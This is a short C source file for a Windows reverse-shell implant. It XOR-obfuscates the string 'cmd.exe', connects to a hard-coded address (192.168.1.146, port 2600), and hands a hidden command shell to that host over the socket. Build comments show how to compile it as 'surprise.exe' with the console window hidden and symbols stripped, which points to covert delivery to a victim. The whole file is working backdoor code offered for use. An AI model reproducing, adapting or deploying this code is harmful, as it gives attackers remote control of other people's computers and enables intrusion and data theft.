#include "implant.h"
// Compilation command: x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32
// futiv command : x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -mwindows -s
int main(){
// Set variables
    char rcvbuffer[DEFAULT_BUFLEN];
    char sndbuffer[DEFAULT_BUFLEN];
    char command[] = { 0x28, 0x26, 0x2F, 0x65, 0x2E, 0x33, 0x2E, 0x00 };
    decode(command, 'K', 7);
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET soc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    SOCKADDR_IN server;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    //clean the struct sinfo & pinfo
    memset(&sinfo, 0, sizeof(sinfo));
    memset(&pinfo, 0, sizeof(pinfo));

    // Assign the count of binary of the struct size
    sinfo.cb = sizeof(sinfo);



    sinfo.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    sinfo.wShowWindow = SW_HIDE;
    sinfo.hStdInput = (HANDLE)soc;
    sinfo.hStdOutput = (HANDLE)soc;
    sinfo.hStdError = (HANDLE)soc;

    // set server's variables
    server.sin_family = AF_INET;
    server.sin_port = htons(2600);
    server.sin_addr.s_addr = inet_addr("192.168.1.146");

    connect(soc, (struct sockaddr *)&server, sizeof(server));

    CreateProcessA(
        NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo
    );
    WaitForSingleObject(pinfo.hProcess, INFINITE);

    














    
// cleanup
    closesocket(soc);
    WSACleanup();

    return 0;
}


char* decode(char* message, char key, int lenght){
    for (int i = 0; i < lenght; i++){
        message[i] = message[i] ^ key;
    }
    return message;
}